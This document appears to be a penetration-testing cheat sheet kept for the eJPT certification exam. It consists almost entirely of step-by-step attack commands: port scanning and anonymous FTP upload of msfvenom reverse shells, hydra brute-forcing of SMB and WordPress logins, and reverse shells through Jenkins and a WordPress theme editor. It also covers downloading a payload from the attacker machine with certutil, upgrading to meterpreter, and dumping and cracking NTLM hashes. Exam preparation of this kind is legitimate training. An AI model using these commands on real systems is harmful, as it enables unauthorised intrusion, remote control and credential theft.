
### Network Recon

nmap -sn <range> -> ping scan

*Store ips in a text file*

nmap -p- -T5 -iL <file> -vv > <file> -> paranoid scan, all ports, very verbose from a text file

nmap -p- -T5 host -vv -Pn -> dont use ping scan


### FTP

*try ftp anonymous always*

msfvenon -p windows/shell_reverse_tcp LHOST=ip LPORT=4444 -f asp > shell.asp -> reverse shell for windows

put shell.asp -> upload reverse shell via ftp to target **CAN WORK OR DONT**

### SMB

smbclient -L "\\\\<ip>\\" -> see SMB shares 

smbclient -L "\\\\<ip>\\<share>" -> connect to smb share

#### Crack SMB

- Store user names in a text file if the user share is accessible
- Use hydra to get a password using a single name or a text file with the users obtained

hydra -l <user_name> -P /usr/share/wordlists/fastrack.txt smb://<ip> -> brute force smb login (fastrack is a very good wordlist for ejpt!)

- Login as User
smbclient -L "\\\\<ip>\\<share>" -U <user_name>


#### Using PSExec (metasploit way)

- Open msfconsole
- Set exploit as psexec
use exploit/windows/smb/psexec
-set rhost to kali machine
-set smbuser <user>
-set smbpass <password>
(Can be tried using bruteforce wordlists)


### Jenkins (port 8000)

*Always try jenkins default creds in the dashboard (admin:admin, jenkins:jenkins, adminstrator:password etc)*

Create a reverse shell (https://github.com/Brzozova/reverse-shell-via-Jenkins)

**Kali machine will have no internet connection! Code needs to be copy pasted from machine to exam machine!**

- Change localhost for to kali's ip
nc -lvnp <port> -> 8044 or other defined in the payload
- run the script console

### Exploit PHP (XAMP webserver port 8080)

Start by running a content scanner like dirb


dirb http://<ip>:<port> /user/share/wordlists/dirb/big.txt -> good wordlist for this

#### Wordpress

Most probably a wordpress will be running on the server, first try to identify useful things like a login page and try default creds.


wpscan --url http//<wp_url>:<port> -e u -> enumerate users

wpscan --url http//<wp_url>:<port> -e ap -t 200 -> enumerate plugins


wpscan --url http//<wp_url>:<port>/<login_page> -U <user> -P /usr/share/wordlists/fasttrack.txt -t 200 -> brute force user login

*Another imporant piece in wordpress is identifying the theme that is running on the website as it can be used as way to get our foot into the system, for example oceanwp is known to be vulnerable to RCE from the dasboard by injecting malicious code in the css theme*

#### Getting reverse shell

Get a php reverse shell (based on the os identified previously with nmap)

For example windows - https://github.com/Dhayalanb/windows-php-reverse-shell

- Start a netcat session: nc -lnvp 9000
- In the case of oceanwp go to the theme editor and inject the shell code.
- Edit the code with the listening port and the kali ip (additionaly store the code in a php file and upload it if copy paste does not work)
- Go to the injected file via url -> http://<url>/wp-content/themes/<theme>/<file>

#### Access the Database

- Use the shell and go to the wp-config.php file and get the database configuration to access it from kali.
- From kali access mysql:
mysql -u root -H <ip> -p -> Access unprotected db, can work or dont, its a gamble.

#### Upload a reverse shell to the system

msfvenom -p windows/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -f exe > shell.exe

- Create a temp directory on the machine - mkdir temp

python3 -m http.server 80 -> start a webserver on kali to upload the payload

certutil.exe -urlcache -f http://<kali_ip>/shell.exe shell.exe -> upload shell to machine

In kali go back to metasploit multi handler

- msfconsole
- use multi/handler
- set payload windows/shell_reverse_tcp
- set lhost <kali_ip>
- set lport 443
- exploit

Transfer shell to meterpreter

- search shell_to
- use 0 
- sessions -i
- set sessions 1
- run
- sessions -i
- sessions 2
- load kiwi

#### Crack user accounts (local)

lsa_dump_sam -> dump ntlm hashes
*store them in a text file* (<user>:<hash>)

john <file> --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 --format=NT -> crack the hashes (you can also use other wordlists such as fasttrack.txt)


### Web Exploits (80, 8000)

curl -v <host> -> recon web page html

#### CMS (example bolt)

Content manage system is the type of web service that is always in ejpt.

Start by exploring the webpage and try to get the CMS framework used.


Search in metasploit for an exploit (bolt example)

-msfconsole
-search bolt
-use exploit/multi/http/bolt_authenticated_rce
-show options




